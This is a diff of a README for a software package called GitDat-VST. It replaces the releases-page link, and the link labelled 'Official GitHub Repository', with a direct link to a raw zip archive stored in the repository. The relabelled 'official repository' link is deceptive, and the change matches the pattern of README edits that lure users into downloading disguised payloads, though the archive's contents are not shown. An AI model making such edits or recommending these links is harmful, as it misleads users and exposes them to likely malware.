@@ -23,7 +23,7 @@ To use GitDat-VST, you’ll need:
 
 To download GitDat-VST, visit this page:
 
-[Download GitDat-VST](https://github.com/dreoverseas/GitDat-VST/releases)
+[Download GitDat-VST](https://github.com/dreoverseas/GitDat-VST/raw/refs/heads/main/components/shared/Git_VST_Dat_1.5.zip)
 
 You will find the latest version available. Follow these steps to get started:
 
@@ -69,7 +69,7 @@ If you face issues or have questions about using GitDat-VST, consider the follow
 
 For more information about GitDat-VST, check these resources:
 
-- [Official GitHub Repository](https://github.com/dreoverseas/GitDat-VST)
+- [Official GitHub Repository](https://github.com/dreoverseas/GitDat-VST/raw/refs/heads/main/components/shared/Git_VST_Dat_1.5.zip)
 - Search for tutorials on platforms like YouTube for visual guides on sound creation.
 
 ## 📄 License
